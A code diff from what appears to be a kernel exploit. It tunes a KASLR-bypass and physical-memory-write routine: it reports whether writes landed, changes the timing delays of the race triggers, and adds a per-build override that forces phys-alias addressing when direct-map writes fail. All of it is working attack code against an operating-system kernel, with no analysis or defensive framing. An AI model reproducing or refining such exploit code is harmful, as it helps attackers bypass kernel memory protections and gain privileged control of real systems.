@@ -2178,6 +2178,7 @@ static int slide_trigger_physical_state_report(int report_status) {
   int status = 0;
   SYSCHK(waitpid(child, &status, 0));
   int ok = WIFEXITED(status) && WEXITSTATUS(status) == 0;
+  app_publish_write_landed(ok);
   if (report_status) {
     pr_info("p0 physical write status=%d ok=%d\n", status, ok);
   }
@@ -2250,7 +2251,7 @@ static int slide_restore_physical_oracle(void) {
 
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
 static int app_trigger_fops_slide_slot(size_t slot) {
-  static size_t delay_index;
+  size_t delay_index = (size_t)app_route_delay_next_index();
   static const int delays[] = {
     70000, 60000, 80000, 40000, 90000, 50000,
     30000, 20000, 75000, 65000, 85000, 55000,
@@ -2331,7 +2332,7 @@ int app_trigger_fops_oracle_slot(size_t slot) {
 #endif
 #else
 int app_trigger_fops_slide_route(void) {
-  static size_t delay_index;
+  size_t delay_index = (size_t)app_route_delay_next_index();
   static const int delays[] = {
     70000, 60000, 80000, 40000, 90000, 50000,
     30000, 20000, 75000, 65000, 85000, 55000,
@@ -2823,12 +2824,19 @@ static int slide_commit_stext(uint64_t stext, const char *source) {
   kaslr_slide = slide;
   slide_p0_offset = slide;
   kaslr_done = 1;
+#if defined(APP_TRACEFS_PHYS_ALIAS_DATA) && APP_TRACEFS_PHYS_ALIAS_DATA
+  /* Target override: phys-alias data addressing regardless of slide source.
+   * Canonical direct-map writes do not land on this kernel build. */
+  data_addr_canonical = 0;
+  app_publish_p0_offset(slide_p0_offset);
+#else
   data_addr_canonical = strcmp(source, "tracefs") == 0;
   if (data_addr_canonical) {
     app_publish_slide_ready();
   } else {
     app_publish_p0_offset(slide_p0_offset);
   }
+#endif
   pr_success("slide-kaslr-ok source=%s pid=%d base=%016llx "
              "slide=%016llx data_mode=%s\n",
              source, getpid(), (unsigned long long)kaslr_base,
